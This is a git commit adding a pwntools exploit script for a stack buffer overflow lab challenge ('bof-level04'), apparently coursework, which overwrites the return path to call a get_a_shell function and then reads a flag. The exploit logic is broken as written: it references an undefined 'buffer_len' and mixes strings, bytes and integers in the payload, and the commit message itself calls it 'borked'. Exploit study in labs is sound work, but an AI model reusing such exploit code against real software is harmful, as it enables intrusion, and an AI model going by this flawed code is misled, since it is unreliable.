f7f1d48c66b487ae8c071c56b9b63b85a5f59c03
Zenna Allwein <zrallwein@gmail.com>
2026-02-12 15:20:04 -0600

    borked my level4 so gonna go back for it

---
+++ unit2/bof-level04/bof-level04.py
@@ -0,0 +1,46 @@
+# SETUP BOILERPLATE
+from pwn import *
+import os
+
+DEBUG = True # toggles gdb.debug or process
+elf = ELF('./bof-level04') # replace this with the actual level
+get_a_shell = p32(elf.symbols["get_a_shell"])
+
+# crash the process to get a core file and find the buffer address (still boilerplate)
+
+# io = elf.process(env={}, setuid=False)
+# io.sendline(cyclic(10000)) # send 1000 junk characters
+# io.wait()
+# core = io.corefile
+# buffer_address = core.stack.find(cyclic(50))
+# os.unlink(core.path) # delete the file now that we're done with it
+
+# launch the main process (still boilerplate)
+if DEBUG:
+    context.log_level = 'DEBUG'
+    context.terminal = ['tmux', 'splitw', '-h']
+    io = elf.debug(env={})
+else:
+    io = elf.process(env={})
+
+
+# END SETUP BOILERPLATE
+# BEGIN CHALLENGE-SPECIFIC CODE
+
+buf_len = 0x80 - 0x8
+
+buffer_start = 0xffffd400
+our_stack =  b"A" * 4 + get_a_shell
+our_stack_len = 0x8 
+our_stack_addr = buffer_start + buffer_len - our_stack_len 
+
+payload = ("A" * buf_len - our_stack_len) + our_stack  + our_stack_addr
+io.sendline(payload)
+
+# END CHALLENGE-SPECIFIC CODE
+# BEGIN FLAG RETRIEVAL BOILERPLATE
+
+import re
+io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
+flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
+print(flag)
